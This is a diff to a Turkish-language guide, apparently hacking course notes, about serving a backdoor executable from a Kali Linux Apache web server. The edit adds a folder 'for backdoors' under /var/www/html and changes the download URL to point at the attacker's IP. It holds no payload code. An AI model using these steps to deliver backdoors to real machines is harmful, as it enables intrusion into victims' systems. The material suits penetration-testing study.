@@ -3,9 +3,9 @@
 
 ### 📂 Dosyayı Web Sunucusuna Taşımak
 - Kali Linux’ta **web sunucu klasörü**: `/var/www/html`  
-- 🎯 Exe dosyasını buraya taşı:  
+- 🎯 Backdoorları koymak için bir klasör oluştur ve exe dosyasını buraya taşı:  
 ```bash
-mv <dosya_adi>.exe /var/www/html/
+mv <dosya_adi>.exe /var/www/html/<klasor_adi>
 ```
 
 ### 🚀 Apache Web Sunucusunu Başlatmak
@@ -17,7 +17,7 @@ service apache2 start
 ### 🌐 Dosyaya Erişmek
 - Tarayıcıya saldırganın IP adresini yaz:  
 ```
-http://<ip_adresi>/<dosya_adi>.exe
+http://<ip_adresi>/<klasor_adi>/<dosya_adi>.exe
 ```
 - 💾 Böylece `.exe` dosyasının indirme bağlantısına ulaşılır  
 
